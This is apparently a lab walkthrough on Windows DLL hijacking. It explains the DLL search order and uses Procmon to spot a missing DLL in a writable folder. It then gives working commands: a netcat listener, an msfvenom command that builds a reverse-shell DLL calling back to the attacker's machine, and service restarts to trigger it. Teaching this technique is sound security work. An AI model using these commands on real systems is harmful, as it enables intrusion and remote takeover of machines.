# <span style="color:lightblue">DLL Hijacking</span>

## <span style="color:lightgreen">Methodology</span>
Windows applications usually load DLL files when started. It may happen that a DLL file does not exist and the application is unable to load it. Nevertheless, an application will continue to execute as long as the missing DLL is not needed.  
In case the application uses a relative and not an absolute file path, Windows searches for the file in the following directories:

-   The directory from which the application is loaded
-   `C:\Windows\System32`
-   `C:\Windows\System`
-   `C:\Windows`
-   The current working directory
-   Directories in the system PATH environment variable
-   Directories in the user PATH environment variable

### Steps taken to perform DLL hijacking are outlined below.

1.  Identify vulnerable application and location
2.  Identify applications PID
3.  Identify vulnerable DLLs that can be hijacked
4.  Use MSFVenom or other payload creation tools to create a malicious DLL
5.  Replace the original DLL with the malicious DLL
6.  Profit

## <span style="color:lightgreen">Detection</span>

###  Windows VM (RDP is required)
1. Transfer [Procmon.exe](https://strontic.github.io/xcyclopedia/library/Procmon.exe-EB2A0D7AC44B9B66E884EE5087305ACC.html) on the Windows VM
2. Right click on `Procmon.exe` and select `'Run as administrator'` from the menu.
3. In procmon, select `"filter"`.  From the left-most drop down menu, select `'Process Name'`.
4. In the input box on the same line type: `dllhijackservice.exe`
5. Make sure the line reads “Process Name is `dllhijackservice.exe` then Include” and click on the `'Add'` button, then `'Apply'` and lastly on 'OK'.
6. Next, select from the left-most drop down menu `'Result'`.
7. In the input box on the same line type: `NAME NOT FOUND`.
8. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the `'Add'` button, then `'Apply'` and lastly on 'OK'.

![image](https://user-images.githubusercontent.com/59029171/161053850-6638a245-75dd-43ea-bbe9-6fecd33ad4c5.png)
![image](https://user-images.githubusercontent.com/59029171/161053869-d2daa643-a03a-4956-a2f0-d5e74457d816.png)

9. Open command prompt and type: 
```console
C:\Temp> sc start dllsvc
```
![image](https://user-images.githubusercontent.com/59029171/161053895-44130b44-4f86-4fe7-8ed2-0f9721fb5896.png)

10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute `'C:\Temp\hijackme.dll'` yet it could not do that as the file was not found. Note that `'C:\Temp'` is a writable location.
![image](https://user-images.githubusercontent.com/59029171/161053920-4af50faa-c6ec-487e-9ec5-142907940e3c.png)

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f dll -o hijackme.dll
```

3. Copy the generated file `hijackme.dll`, to the Windows VM.

### Windows VM

1. Place `hijackme.dll` in` 'C:\Temp'`
2. Open command prompt and type: 
```console
C:\Temp> sc stop dllsvc & sc start dllsvc
```

### Kali VM

1. Wait for a reverse shell on your kali machine.


